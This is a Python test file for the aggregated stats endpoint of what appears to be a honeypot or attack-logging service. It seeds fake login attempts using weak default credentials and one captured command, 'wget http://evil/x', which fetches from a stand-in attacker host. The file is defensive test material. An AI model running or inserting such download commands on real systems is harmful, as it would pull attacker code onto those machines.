"""Tests for the aggregated stats endpoint."""


def _seed(client, base):
    events = [
        {**base, "source_ip": "203.0.113.1", "username": "root", "password": "123456"},
        {**base, "source_ip": "203.0.113.1", "username": "root", "password": "123456"},
        {**base, "source_ip": "203.0.113.2", "username": "admin", "password": "admin"},
        {
            **base,
            "source_ip": "203.0.113.3",
            "event_type": "command_exec",
            "username": None,
            "password": None,
            "command": "wget http://evil/x",
        },
    ]
    client.post("/api/v1/events", json=events)


def test_summary_counts(client, sample_event):
    _seed(client, sample_event)
    summary = client.get("/api/v1/stats/summary").json()

    assert summary["total_events"] == 4
    assert summary["unique_source_ips"] == 3
    assert summary["unique_sensors"] == 1

    types = {c["key"]: c["count"] for c in summary["events_by_type"]}
    assert types["login_attempt"] == 3
    assert types["command_exec"] == 1

    top_user = summary["top_usernames"][0]
    assert top_user["key"] == "root"
    assert top_user["count"] == 2

    assert summary["first_event"] is not None
    assert summary["last_event"] is not None


def test_summary_empty(client):
    summary = client.get("/api/v1/stats/summary").json()
    assert summary["total_events"] == 0
    assert summary["top_source_ips"] == []
